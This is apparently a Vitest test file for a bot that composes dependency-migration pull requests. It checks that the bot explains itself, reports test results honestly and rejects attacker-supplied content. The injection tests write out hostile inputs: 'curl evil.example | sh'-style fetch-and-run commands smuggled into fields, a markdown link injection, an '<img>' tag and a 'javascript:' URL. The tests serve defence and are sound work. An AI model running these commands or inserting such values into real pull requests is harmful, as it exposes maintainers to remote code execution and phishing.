import { describe, expect, it } from "vitest";
import {
  composePullRequest,
  UnsafeContentError,
  type ComposeOptions,
} from "../../src/forge/pull-request.ts";

/**
 * Pull request composition.
 *
 * Two things are being tested, and the second is easy to overlook.
 *
 * The body is the only part of Driftless a maintainer sees, so it has to
 * explain itself or the pull request gets closed regardless of the diff.
 *
 * It is also a *trusted channel*. A maintainer reads it believing it came from
 * us. Echoing attacker-controlled upstream text into it launders that text
 * through our credibility, and defeats the diff policy entirely because the
 * payload is the prose rather than the code.
 */

function options(overrides: Partial<ComposeOptions> = {}): ComposeOptions {
  return {
    change: {
      packageName: "acme-sdk",
      fromVersion: "2.9.1",
      toVersion: "3.0.0",
      ecosystem: "npm",
      corroboratedBy: ["registry", "artifact", "spec"],
      impactedSymbols: ["createClient"],
    },
    impact: "stranded",
    verification: { tests: "passed", command: "npm test", policyVerdict: "allow" },
    filesChanged: 3,
    changeKey: "acme-sdk@3.0.0",
    optOutUrl: "https://driftless.dev/opt-out/abc123",
    ...overrides,
  };
}

describe("the body earns the merge", () => {
  it("explains why the pull request arrived unannounced", () => {
    // A maintainer's first question is never "what does this do". It is "who
    // are you and why is this here".
    const { body } = composePullRequest(options());
    expect(body).toMatch(/stops receiving fixes|nothing is broken/);
    expect(body).toContain("Opened by Driftless");
  });

  it("frames an exposed repository with more urgency than a stranded one", () => {
    const stranded = composePullRequest(options({ impact: "stranded" })).body;
    const exposed = composePullRequest(options({ impact: "exposed" })).body;
    expect(stranded).toContain("nothing is broken");
    expect(exposed).toContain("may already be affecting builds");
  });

  it("states the version transition and affected API", () => {
    const { body, title } = composePullRequest(options());
    expect(title).toBe("acme-sdk: migrate to 3.0.0");
    expect(body).toContain("`2.9.1` → `3.0.0`");
    expect(body).toContain("`createClient`");
  });

  it("carries a machine-readable change key for idempotency", () => {
    expect(composePullRequest(options()).body).toContain(
      "<!-- driftless:change=acme-sdk@3.0.0 -->",
    );
  });

  it("always offers an opt-out", () => {
    // We are opening pull requests nobody asked for. A bot with no visible off
    // switch earns a block and a public complaint — the opt-out is what makes
    // the cold-start motion survivable.
    const { body } = composePullRequest(options());
    expect(body).toContain("Not useful?");
    expect(body).toContain("https://driftless.dev/opt-out/abc123");
  });

  it("says plainly that it cannot merge", () => {
    expect(composePullRequest(options()).body).toContain("cannot merge");
  });

  it("names the corroborating sources without quoting them", () => {
    const { body } = composePullRequest(options());
    expect(body).toContain("registry, artifact and spec");
    expect(body).toContain("a single source is never enough");
  });
});

describe("honesty about verification", () => {
  it("reports a passing test run with the command", () => {
    const { body } = composePullRequest(options());
    expect(body).toContain("passed");
    expect(body).toContain("`npm test`");
  });

  it("states a test failure prominently rather than burying it", () => {
    // A migration presented as verified when it is not destroys the only thing
    // that makes these pull requests worth opening.
    const { body } = composePullRequest(
      options({ verification: { tests: "failed", command: "npm test", policyVerdict: "allow" } }),
    );
    expect(body).toContain("**The repository's test suite did not pass");
    expect(body).toContain("needs work before merging");
  });

  it("admits when there was no suite to run", () => {
    const { body } = composePullRequest(
      options({ verification: { tests: "no-suite", command: null, policyVerdict: "allow" } }),
    );
    expect(body).toContain("No test suite was detected");
    expect(body).toContain("review it more closely");
  });

  it("admits when the suite was not run at all", () => {
    const { body } = composePullRequest(
      options({ verification: { tests: "not-run", command: null, policyVerdict: "allow" } }),
    );
    expect(body).toContain("unverified");
  });

  it("distinguishes a clean policy pass from a human-reviewed escalation", () => {
    const clean = composePullRequest(options()).body;
    const escalated = composePullRequest(
      options({
        verification: { tests: "passed", command: "npm test", policyVerdict: "escalate" },
      }),
    ).body;
    expect(clean).toContain("passed automated policy checks");
    expect(escalated).toContain("reviewed by a human");
  });
});

describe("attacker text cannot reach the body", () => {
  it("refuses a package name carrying markdown", () => {
    // The package name is publisher-controlled and lands inside a table cell.
    expect(() =>
      composePullRequest(
        options({
          change: { ...options().change, packageName: "acme](https://evil.example)[x" },
        }),
      ),
    ).toThrow(UnsafeContentError);
  });

  it("refuses a version string carrying markup", () => {
    expect(() =>
      composePullRequest(
        options({ change: { ...options().change, toVersion: "3.0.0<img src=x>" } }),
      ),
    ).toThrow(UnsafeContentError);
  });

  it("refuses an impacted symbol that is not an identifier", () => {
    expect(() =>
      composePullRequest(
        options({
          change: {
            ...options().change,
            impactedSymbols: ["`; curl https://evil.example | bash; `"],
          },
        }),
      ),
    ).toThrow(UnsafeContentError);
  });

  it("refuses a corroboration source name carrying text", () => {
    expect(() =>
      composePullRequest(
        options({
          change: {
            ...options().change,
            corroboratedBy: ["registry — run `curl evil.example | sh` before merging"],
          },
        }),
      ),
    ).toThrow(UnsafeContentError);
  });

  it("has no parameter a changelog could be passed through", () => {
    // The structural defence. There is nowhere to put upstream prose, so the
    // laundering attack has no entry point rather than being filtered at one.
    const composed = composePullRequest(options());
    const keys = Object.keys(options().change);
    expect(keys).not.toContain("changelog");
    expect(keys).not.toContain("releaseNotes");
    expect(keys).not.toContain("description");
    expect(composed.body).not.toMatch(/curl|bash|\bsh\b/);
  });
});

describe("links", () => {
  it("accepts an upstream link on a known host", () => {
    const { body } = composePullRequest(
      options({ upstreamUrl: "https://github.com/acme/sdk/releases/tag/v3.0.0" }),
    );
    expect(body).toContain("https://github.com/acme/sdk/releases/tag/v3.0.0");
  });

  it("refuses a link to an arbitrary host", () => {
    // A link in a trusted body is a phishing vector: the text says "release
    // notes" and the href says whatever the publisher chose.
    expect(() =>
      composePullRequest(options({ upstreamUrl: "https://evil.example/release" })),
    ).toThrow(UnsafeContentError);
  });

  it("refuses a non-https link", () => {
    expect(() =>
      composePullRequest(options({ upstreamUrl: "http://github.com/acme/sdk" })),
    ).toThrow(UnsafeContentError);
  });

  it("refuses a javascript: URL", () => {
    expect(() =>
      composePullRequest(options({ upstreamUrl: "javascript:alert(1)" })),
    ).toThrow(UnsafeContentError);
  });

  it("refuses a malformed opt-out URL", () => {
    expect(() => composePullRequest(options({ optOutUrl: "not a url" }))).toThrow(
      UnsafeContentError,
    );
  });
});

describe("formatting", () => {
  it("summarises a long symbol list rather than dumping it", () => {
    const symbols = Array.from({ length: 20 }, (_, i) => `symbol${i}`);
    const { body } = composePullRequest(
      options({ change: { ...options().change, impactedSymbols: symbols } }),
    );
    expect(body).toContain("and 14 more");
  });

  it("omits the API row when nothing specific was impacted", () => {
    const { body } = composePullRequest(
      options({ change: { ...options().change, impactedSymbols: [] } }),
    );
    expect(body).not.toContain("Affected API");
  });

  it("normalises a leading v in versions", () => {
    const { title } = composePullRequest(
      options({ change: { ...options().change, toVersion: "v3.0.0" } }),
    );
    expect(title).toBe("acme-sdk: migrate to 3.0.0");
  });

  it("accepts a scoped package name", () => {
    const { title } = composePullRequest(
      options({ change: { ...options().change, packageName: "@anthropic-ai/sdk" } }),
    );
    expect(title).toContain("@anthropic-ai/sdk");
  });
});
